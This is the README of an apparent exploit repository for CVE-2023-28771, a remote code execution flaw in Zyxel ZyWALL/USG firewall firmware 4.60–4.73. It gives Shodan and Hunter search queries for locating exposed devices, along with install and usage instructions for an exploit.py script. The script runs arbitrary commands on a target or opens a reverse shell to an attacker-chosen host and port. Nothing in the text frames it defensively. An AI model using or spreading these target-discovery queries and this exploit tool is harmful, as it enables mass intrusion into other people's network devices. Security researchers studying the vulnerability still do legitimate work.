# CVE-2023-28771
![](https://img.shields.io/static/v1?label=Product&message=Zyxel&color=blue)
![](https://img.shields.io/static/v1?label=Version&message=ZyWALL/USG%20series%20firmware%20versions%204.60%20through%204.73&color=brighgreen)
![](https://img.shields.io/static/v1?label=Vulnerability&message=CVSSv3:%209.8.%20Remote%20Code%20Execution&color=red)



- Shodan dork:
```
/ext-js/app/common/zld_product_spec.js
```
- [Hunter](https://hunter.how) dork:
```
web.body="/ext-js/app/common/zld_product_spec.js"
```


## Install
Requires the scapy Python library for sending IKE packets.

```
pip install -r requirements.txt

```
```
usage: exploit.py [-h] [--cmd CMD] [--lhost LHOST] [--lport LPORT] rhost

positional arguments:
  rhost

options:
  -h, --help     show this help message and exit
  --cmd CMD
  --lhost LHOST
  --lport LPORT
```

Either use --cmd to run an arbitrary command, or use --lport and --lhost to spawn a revshell
